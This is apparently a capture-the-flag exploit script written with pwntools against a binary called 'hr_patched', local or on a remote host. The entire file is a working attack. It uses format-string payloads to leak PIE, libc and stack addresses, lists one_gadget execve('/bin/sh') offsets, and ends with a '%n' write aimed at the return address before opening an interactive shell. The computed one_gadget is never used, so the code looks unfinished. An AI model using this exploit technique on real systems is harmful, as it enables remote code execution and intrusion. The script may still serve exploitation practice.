from pwn import *


#-------------------------------


#-------------------------------



local = True

elf = ELF('./hr_patched')

if local:
    io = elf.process()
else:
    io = remote('10.25.1.122', 9998)

pause()

io.recvuntil(b"shell!")

pld1 = b""
pld1 += b"%45$p, %43$p, %44$p"

io.sendline(pld1)
io.recvline()
leak = io.recvline()
info(f"leak: {leak}")

addresses = [address.strip() for address in leak.split(b',')]

# Convert the hexadecimal strings to integers
pie_leak = int(addresses[0], 16)
libc_leak = int(addresses[1], 16)
rip_leak = int(addresses[2], 16)

print("pie_leak:", hex(pie_leak))
print("libc_leak:", hex(libc_leak))
print("rip_leak:", hex(rip_leak))
pie_base = pie_leak - 0x11fc
libc_base = libc_leak - 0x276ca
rip = rip_leak - 0xf8

print("pie_base:", hex(pie_base))
print("libc_base:", hex(libc_base))
print("rip at:", hex(rip))

#0xe6c7e execve("/bin/sh", r15, r12)
#constraints:
#  [r15] == NULL || r15 == NULL || r15 is a valid argv
#  [r12] == NULL || r12 == NULL || r12 is a valid envp
#
#0xe6c81 execve("/bin/sh", r15, rdx)
#constraints:
#  [r15] == NULL || r15 == NULL || r15 is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
#
#0xe6c84 execve("/bin/sh", rsi, rdx)
#constraints:
#  [rsi] == NULL || rsi == NULL || rsi is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
#

one_gadget = libc_base + 0xe6c7e


pld2 = b""
pld2 += b"%1337pAA"
pld2 += b"%c%c%c%c"
pld2 += b"%c%c%c%n"
pld2 += p64(rip)



io.sendline(pld2)

io.interactive()
